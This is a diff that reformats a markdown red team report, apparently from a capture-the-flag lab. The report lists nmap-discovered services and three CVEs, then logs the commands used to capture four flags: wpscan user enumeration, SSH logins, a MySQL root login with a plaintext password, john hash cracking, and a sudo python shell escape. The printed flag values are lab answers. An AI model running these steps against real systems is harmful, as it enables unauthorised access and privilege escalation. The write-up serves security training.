@@ -1,13 +1,14 @@
-﻿###Red Team: Summary of Operations
+**Red Team: Summary of Operations**
 
 
-###Table of Contents
+**Table of Contents**
 - Exposed Services
 - Critical Vulnerabilities
 - Exploitation
 
 
-###Exposed Services
+**Exposed Services**
+
 Nmap scan results for each machine reveal the below services and OS details:
 `’’bash
 $ nmap -sV 192.168.1.100/24
@@ -16,19 +17,16 @@ $ nmap -sV 192.168.1.100/24
 This scan identifies the services below as potential points of entry:
 - Target 1
   - List of Exposed Ports/Services
-22/tcp                open        SSH                 OpenSSH
-80/tcp                 open        http                 Apache
-111/tcp         open         rpcbind         2-4
-139/tcp         open         netbios-ssn        Samba
-445/tcp        open        netbios-ssn        Samba
+22/tcp           open        SSH                OpenSSH
+80/tcp           open        http               Apache
+111/tcp          open        rpcbind            2-4
+139/tcp          open        netbios-ssn        Samba
+445/tcp          open        netbios-ssn        Samba
 
+ 
+**List of Critical Vulnerabilities**
 
-The following vulnerabilities were identified on each target:
-Target 1
-
-
-###List of Critical Vulnerabilities
-
+The following vulnerabilities were identified:
 
 CVE-2014-0226 - allows remote attackers to cause a denial of service (heap-based buffer 
 overflow), or possibly obtain sensitive credential information or execute arbitrary code. The first vulnerability allows hackers to potentially access sensitive information. With the scan that was used to find vulnerabilities it will also give the bad actor directories marked as interesting highlighting that there may be something of use in those directories.
@@ -38,18 +36,10 @@ CVE-2014-3503 - pertains to weak random values to generate passwords, which make
 . 
 CVE-2000-0525 - OpenSSH does not properly drop privileges when the UseLogin option is enabled, which allows local users to execute arbitrary commands by providing the command to the ssh daemon. With an SSH connection that comes from an unknown IP address, the system can expose information that the hacker can further leverage to manipulate the system even more.
 
+(Images/target1_vulnscan.jpg)
 
 
-
-  
-
-
-
-
-
-
-
-###Exploitation
+**Exploitation**
 
 
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
@@ -58,7 +48,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
      **Exploit Used**
       - viewed HTML source code
       - used Page inspect
-
+      (Images/flag_1.jpg)
 
   
 
@@ -70,14 +60,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 Commands        -wpscan --url http://192.168.1.110/wordpress --enumerate u
                       - ssh michael@192.168.1.110
                       - cat flag2.txt
-  
-
-
-
-   
-
-
-
+                      (Images/flag_2.jpg)
 
     -  ‘flag3’: flag3{afc01ab56b50591e7dccf93122770cd2}
        **Exploit Used**
@@ -86,12 +69,7 @@ Commands        -wpscan --url http://192.168.1.110/wordpress --enumerate u
         - flag found in the table
 Commands        - mysql -u root -p ‘R@v3nSecurity’
                         - show databases; use wordpress; show tables; select * from wp_posts;
-
-
-  
-
-
-
+                        (Images/flag_3.jpg)
 
 
      -   ‘flag4’: flag4{715dea6c055b9fe3337544932f2941ce}
@@ -106,3 +84,4 @@ Commands        - john wp_hashes.txt -wordlist=rockyou.txt
                          - ssh steven@192.168.1.110
                           - sudo python, import os, os.system(“/bin/bash”)
                           - cat flag4.txt
+                          (Images/flag_4.jpg)
